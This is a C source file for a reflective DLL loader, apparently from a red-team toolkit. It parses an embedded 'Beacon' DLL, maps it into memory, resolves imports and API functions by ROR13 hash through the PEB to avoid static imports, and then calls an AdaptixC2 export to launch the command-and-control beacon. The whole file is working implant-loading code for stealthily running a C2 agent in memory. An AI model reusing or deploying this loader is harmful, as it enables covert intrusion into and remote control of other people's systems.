#include <windows.h>
#include "tcg.h"
#include "util.h"
#include "loader.h"

/*
 * Removes RWX from DLL sections after loading, and applies the appropriate permissions based on the section characteristics
 */

/*
 * Opt-in Dynamic Function Resolution resolver. It turns MODULE$Function into pointers.
 * See dfr "resolve" "ror13" in loader.spec
 * findModuleByHash resolves a module by scanning the InMemoryOrderModuleList in the Process Environment Block (PEB).
 * findFunctionByHash locates a function by iterating over the Export Address Table (EAT) of the resolved module.
 */
FARPROC resolve(DWORD modHash, DWORD funcHash) {
	HANDLE hModule = findModuleByHash(modHash);
	return findFunctionByHash(hModule, funcHash);
}
 
void go() {
	char * dst;
	char * src;
	DLLDATA dll;
	IMPORTFUNCS funcs;

	/* fetch Beacon DLL from section */
	src = GETRESOURCE(_DLL_);

	/* parse Beacon DLL! */
	ParseDLL(src, &dll);

	/* allocate memory for it! */
	dst =  KERNEL32$VirtualAlloc ( NULL, SizeOfDLL ( &dll ), MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );

	/* load DLL into memory */
	LoadDLL(&dll, src, dst);

	/* setup IMPORTFUNCS data structure */
	funcs.GetProcAddress = GetProcAddress;
	funcs.LoadLibraryA   = LoadLibraryA;

	/* process the imports */
	ProcessImports(&funcs, &dll, dst);

	/* fix section permissions */
	fix_section_permissions(&dll, src, dst);

	/* Call the exported AdaptixC2 "GetVersions" function which will trigger the beacon */
	_GetVersions pGetVersions = (_GetVersions)findFunctionByHash((HANDLE)dst, ror13hash("GetVersions"));
	if (pGetVersions != NULL) {
		pGetVersions();
	}
}
